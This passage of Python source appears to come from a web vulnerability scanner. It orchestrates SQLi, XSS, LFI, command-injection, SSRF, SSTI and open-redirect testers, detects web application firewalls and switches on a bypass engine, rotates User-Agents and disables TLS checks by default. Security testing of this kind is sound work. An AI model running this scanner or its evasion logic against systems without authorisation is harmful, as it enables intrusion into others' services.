        if resp is None:
            return None

        # Check for 3xx redirect
        if 300 <= resp.status_code < 400:
            location = resp.headers.get("Location", "")
            if self._is_external_redirect(location, self._CANARY_DOMAIN):
                # Verify: send again
                try:
                    if method.upper() == "GET":
                        resp2 = self._session.get(
                            url, params={param: payload},
                            timeout=self._timeout, allow_redirects=False,
                        )
                    else:
                        resp2 = self._session.post(
                            url, data={param: payload},
                            timeout=self._timeout, allow_redirects=False,
                        )
                except requests.RequestException:
                    return None

                if resp2 and 300 <= resp2.status_code < 400:
                    loc2 = resp2.headers.get("Location", "")
                    if self._is_external_redirect(loc2, self._CANARY_DOMAIN):
                        return ScanFinding(
                            vuln_class="Open Redirect",
                            url=url,
                            param=param,
                            payload=payload,
                            evidence=(
                                f"Redirects to external domain: "
                                f"{location}"
                            ),
                            severity="MEDIUM",
                            confidence=0.9,
                            status="confirmed",
                        )

        # Also check response body for meta-refresh or JS redirects
        if resp.status_code == 200:
            body = resp.text.lower()
            canary = self._CANARY_DOMAIN.lower()
            if canary in body:
                if re.search(
                    r'(window\.location|location\.href|http-equiv=["\']refresh)',
                    body,
                ):
                    return ScanFinding(
                        vuln_class="Open Redirect",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence="Client-side redirect to external domain detected",
                        severity="MEDIUM",
                        confidence=0.75,
                        status="likely",
                    )

        return None

    @staticmethod
    def _is_external_redirect(location: str, canary_domain: str) -> bool:
        """Check if a Location header redirects to the canary domain.

        Uses strict netloc comparison via URL parsing rather than
        substring matching to avoid false positives from partial
        domain matches.
        """
        if not location:
            return False
        # Protocol-relative URLs (e.g. //evil.example.com/path)
        if location.startswith("//"):
            try:
                parsed = urllib.parse.urlparse("https:" + location)
                return parsed.netloc == canary_domain
            except ValueError:
                return False
        # Absolute URLs
        try:
            parsed = urllib.parse.urlparse(location)
            if parsed.netloc:
                return parsed.netloc == canary_domain
        except ValueError:
            pass
        return False


# ═══════════════════════════════════════════════════════════════════════════
# Phase 4: Output Formatter
# ═══════════════════════════════════════════════════════════════════════════


def format_findings(findings: list[ScanFinding]) -> str:
    """Format findings into a human-readable report."""
    if not findings:
        return "No vulnerabilities detected."

    lines: list[str] = []
    lines.append("=" * 72)
    lines.append("VULNERABILITY SCAN REPORT")
    lines.append("=" * 72)

    by_class: dict[str, list[ScanFinding]] = {}
    for f in findings:
        by_class.setdefault(f.vuln_class, []).append(f)

    for vuln_class, class_findings in by_class.items():
        lines.append("")
        lines.append(f"[{vuln_class}]")
        lines.append("-" * 40)
        for f in class_findings:
            lines.append(f"  URL:        {f.url}")
            lines.append(f"  Parameter:  {f.param}")
            lines.append(f"  Payload:    {f.payload}")
            lines.append(f"  Evidence:   {f.evidence}")
            lines.append(f"  Severity:   {f.severity}")
            lines.append(f"  Confidence: {f.confidence:.0%}")
            lines.append(f"  Status:     {f.status}")
            lines.append("")

    lines.append("=" * 72)
    lines.append(f"Total findings: {len(findings)}")
    lines.append("=" * 72)
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
# Main Scanner Orchestrator
# ═══════════════════════════════════════════════════════════════════════════


class VulnScanner:
    """Production-grade vulnerability scanner.

    Usage::

        scanner = VulnScanner()
        findings = scanner.scan(
            url="http://target.example.com/page",
            params={"id": "1"},
            method="GET",
        )
        print(format_findings(findings))
    """

    def __init__(
        self,
        timeout: int = _DEFAULT_TIMEOUT,
        delay_range: tuple[float, float] = (0.5, 2.0),
        verify_ssl: bool = False,
    ):
        self._timeout = timeout
        self._delay_range = delay_range
        self._session = requests.Session()
        self._session.verify = verify_ssl
        self._session.headers.update({
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        self._waf_detector = WAFDetector(self._session, timeout)
        self._bypass_engine = WAFBypassEngine()
        self._waf_detected = False
        self._detected_wafs: list[str] = []

    @property
    def detected_wafs(self) -> list[str]:
        return list(self._detected_wafs)

    def scan(
        self,
        url: str,
        params: dict[str, str] | None = None,
        method: str = "GET",
    ) -> list[ScanFinding]:
        """Run full vulnerability scan against *url*.

        Args:
            url: Target URL.
            params: Dict of parameter names → default values to test.
            method: HTTP method (GET or POST).

        Returns:
            List of confirmed :class:`ScanFinding` instances.
        """
        if params is None:
            params = {}

        findings: list[ScanFinding] = []

        # Phase 1: WAF Detection
        self._detected_wafs = self._waf_detector.detect(url)
        self._waf_detected = bool(self._detected_wafs)
        if self._waf_detected:
            logger.info("WAF detected: %s", self._detected_wafs)

        bypass = self._bypass_engine if self._waf_detected else None

        # Phase 3: Vulnerability Testing (per parameter)
        testers = [
            SQLiTester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
            XSSTester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
            LFITester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
            CMDiTester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
            SSRFTester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
            SSTITester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
            OpenRedirectTester(
                self._session, bypass, self._waf_detected,
                self._timeout, self._delay_range,
            ),
        ]

        for param_name, param_value in params.items():
            for tester in testers:
                try:
                    results = tester.test(url, method, param_name, param_value)
                    findings.extend(results)
                except Exception as exc:
                    logger.warning(
                        "Tester %s failed for param %s: %s",
                        type(tester).__name__, param_name, exc,
                    )

        return findings
